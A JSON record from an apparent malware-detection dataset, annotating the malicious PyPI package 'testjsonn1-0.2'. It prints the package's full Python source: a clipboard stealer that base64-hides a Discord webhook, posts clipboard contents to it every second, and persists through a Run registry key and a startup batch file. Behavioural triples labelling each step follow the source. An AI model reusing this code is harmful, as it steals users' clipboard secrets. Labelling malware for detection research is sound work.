{
  "metadata": {
    "package_name": "testjsonn1-0.2",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/testjsonn1-0.2.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/testjsonn1-0.2.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import time\nimport pyperclip\nimport requests\nimport base64\nimport io\nimport os\nimport sys\nimport winreg as reg\n\ndef main():\n    licenseCD = '''aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjM5MTY1Mzk5MDE0MjAxMy9wNmVqSW1qRnhmMlJYakpPM3ZKQmg2VXZQQ2VuS2FsalhKMmR6SDFCd2NkYVdnT1BjR0lkSFY3eGNRWTIxWThoTzhZLQ=='''\n    strb = base64.b64decode(licenseCD)\n    mk = strb.decode('utf-8')\n    send_txt = \"\"\n    n = b'{\"content\": [\"Must be 2000 or fewer in length.\"]}'\n\n    if check_persistence('MyStartupScript'):\n        while True:\n            txt = pyperclip.paste()\n            if send_txt == txt:\n                time.sleep(1)\n            else:\n                data = {\n                    'content': f\"```{txt}```\"\n                }\n                response = requests.post(mk, data=data)\n                if response.content == n:\n                    file = io.BytesIO(txt.encode('utf-8'))\n                    file.name = 'filename.txt'\n                    payload = {\n                        \"file\": (file.name, file)\n                    }\n                    response = requests.post(mk, files=payload)\n                send_txt = txt\n            time.sleep(1)\n    else:\n        add_to_startup()\n\ndef add_to_startup():\n    script_path = os.path.abspath(sys.argv[0])\n    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\\\Windows')\n    bat_name = 'startup_script.bat'\n\n    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:\n        bat_file.write(f'@echo off\\nstart \"\" pythonw \"{script_path}\"\\nexit')\n\n    key = reg.HKEY_CURRENT_USER\n    sub_key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)\n    reg.SetValueEx(reg_key, \"MyStartupScript\", 0, reg.REG_SZ, bat_path)\n    reg.CloseKey(reg_key)\n\ndef check_persistence(program_name):\n    hives = [\n        reg.HKEY_LOCAL_MACHINE,\n        reg.HKEY_CURRENT_USER\n    ]\n    paths = [\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n    ]\n    for hive in hives:\n        for path in paths:\n            try:\n                with reg.OpenKey(hive, path, 0, reg.KEY_READ) as key:\n                    try:\n                        reg.QueryValueEx(key, program_name)\n                        return True\n                    except FileNotFoundError:\n                        continue\n            except FileNotFoundError:\n                continue\n    return False",
          "triple_sequences": [
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "licenseCD",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "strb",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "check_persistence()",
              "action_description": "Checks if persistence entry exists",
              "action_id": "check_persistence_entry",
              "object": "MyStartupScript",
              "object_description": "Startup entry",
              "object_id": "startup_entry",
              "intention_description": "Determine presence of marker file",
              "intention_id": "determine_marker_file_presence"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "1",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "mk, data=data",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "io.BytesIO()",
              "action_description": "Creates in-memory bytes buffer from encoded string",
              "action_id": "create_memory_bytes",
              "object": "txt.encode('utf-8')",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "mk, files=payload",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "1",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "os.path.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "sys.argv[0]",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Get script file path",
              "intention_id": "get_script_file_path"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "bat_path, bat_name",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "os.path.join(bat_path, bat_name), 'w'",
              "object_description": "Batch file path",
              "object_id": "batch_file_path",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "@echo off\nstart \"\" pythonw \"{script_path}\"\nexit",
              "object_description": "Batch file content",
              "object_id": "batch_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "reg.OpenKey()",
              "action_description": "Opens registry key",
              "action_id": "open_registry_key",
              "object": "key, sub_key, 0, reg.KEY_ALL_ACCESS",
              "object_description": "Windows registry key",
              "object_id": "windows_registry_key",
              "intention_description": "Access Windows registry key",
              "intention_id": "access_registry_key"
            },
            {
              "action_api": "reg.SetValueEx()",
              "action_description": "Sets value for registry key",
              "action_id": "set_registry_value",
              "object": "reg_key, \"MyStartupScript\", 0, reg.REG_SZ, bat_path",
              "object_description": "Registry value",
              "object_id": "registry_value",
              "intention_description": "Add registry value for startup",
              "intention_id": "add_startup_registry_entry"
            },
            {
              "action_api": "reg.CloseKey()",
              "action_description": "Closes the opened registry key",
              "action_id": "close_registry_key",
              "object": "reg_key",
              "object_description": "Registry key handle",
              "object_id": "registry_key_handle",
              "intention_description": "Release system resource",
              "intention_id": "release_system_resource"
            },
            {
              "action_api": "reg.OpenKey()",
              "action_description": "Opens registry key",
              "action_id": "open_registry_key",
              "object": "hive, path, 0, reg.KEY_READ",
              "object_description": "Windows registry key",
              "object_id": "windows_registry_key",
              "intention_description": "Access Windows registry key",
              "intention_id": "access_registry_key"
            },
            {
              "action_api": "reg.QueryValueEx()",
              "action_description": "Retrieves value and data type for registry value",
              "action_id": "get_registry_value",
              "object": "key, program_name",
              "object_description": "Registry value name",
              "object_id": "registry_value_name",
              "intention_description": "Access registry value",
              "intention_id": "access_registry_value"
            }
          ]
        }
      ]
    }
  ]
}